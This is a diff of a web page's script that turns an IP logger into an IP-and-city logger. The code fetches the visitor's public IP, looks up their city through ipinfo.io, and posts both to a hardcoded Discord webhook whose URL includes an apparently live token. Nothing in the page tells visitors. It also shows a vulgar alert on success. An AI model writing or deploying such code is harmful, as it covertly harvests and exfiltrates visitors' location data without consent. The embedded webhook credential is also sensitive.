@@ -5,7 +5,7 @@
 </head>
 <body>
     <script>
-        // Function to send IP address to Discord webhook
+        // Function to send IP address and city to Discord webhook
         function sendIPToWebhook() {
             // Get the user's IP address using a free service
             fetch('https://api.ipify.org?format=json')
@@ -13,29 +13,40 @@
                 .then(data => {
                     const ipAddress = data.ip;
                     
-                    // Construct the payload
-                    const payload = {
-                        content: `User IP: ${ipAddress}`
-                    };
+                    // Fetch city information based on IP address
+                    fetch(`https://ipinfo.io/${ipAddress}/json?token=YOUR_IPINFO_TOKEN`)
+                        .then(response => response.json())
+                        .then(ipInfo => {
+                            const city = ipInfo.city;
+                            
+                            // Construct the payload
+                            const payload = {
+                                content: `User IP: ${ipAddress}, City: ${city}`
+                            };
 
-                    // Make a POST request to the Discord webhook
-                    fetch('https://discord.com/api/webhooks/1234480011193483356/ObM_OYrW-7_ujLYBXHlleFE9gXSxMLiG6UnV9jvPiiXYAwtCN13ZPG6o4n8Cgie9xR8M', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(payload)
-                    })
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error('Failed to send IP address to webhook');
-                        }
-                        alert('HI');
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        alert('failed');
-                    });
+                            // Make a POST request to the Discord webhook
+                            fetch('https://discord.com/api/webhooks/1234480011193483356/ObM_OYrW-7_ujLYBXHlleFE9gXSxMLiG6UnV9jvPiiXYAwtCN13ZPG6o4n8Cgie9xR8M', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify(payload)
+                            })
+                            .then(response => {
+                                if (!response.ok) {
+                                    throw new Error('web gone');
+                                }
+                                alert('suck my dick');
+                            })
+                            .catch(error => {
+                                console.error('Error:', error);
+                                alert('Failed to send');
+                            });
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                            alert('Failed to retrieve c');
+                        });
                 })
                 .catch(error => {
                     console.error('Error:', error);
